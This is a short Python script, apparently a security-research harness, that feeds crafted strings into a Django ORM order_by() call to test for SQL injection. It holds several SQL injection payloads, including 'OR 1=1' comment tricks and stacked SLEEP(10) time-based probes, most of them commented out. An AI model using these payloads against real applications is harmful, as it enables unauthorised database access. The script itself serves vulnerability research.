
import sys

from django_setup import configure_django


configure_django()


from database_seed import seed_all
from util.input_sanitizer import sanitize_input
from targets.registry import TARGETS
from util.errors import SAFE_EXCEPTIONS, IGNORED_MESSAGES


# configure_django()
seed_all()


from app.models import Book

# payload = "pk__e;--.;-- OR 1=1 --"

# payload = "pk__e.` OR 1=1 -- "

# payload = "pk__e.` OR 1=1 -- "

# payload = "pk__e`.`x OR 1=1 --"

# payload = "pk__e.b OR 1=1 --"

# payload = "app_book.id OR 1=1 --"

# payload = "pk__.id OR 1=1 --"

payload = "pk__.`e` OR 1=1 ) ASC; --"



# payload = "author__id.`book`), SLEEP(10); SLEEP(10); --"

def load_payload():
    fh = open(sys.argv[1], "rb")
    data = fh.read()
    fh.close()
    return data.decode("ascii")[1:]

# payload = load_payload()

qs = Book.objects.order_by(payload)

print(qs.query)
list(qs)

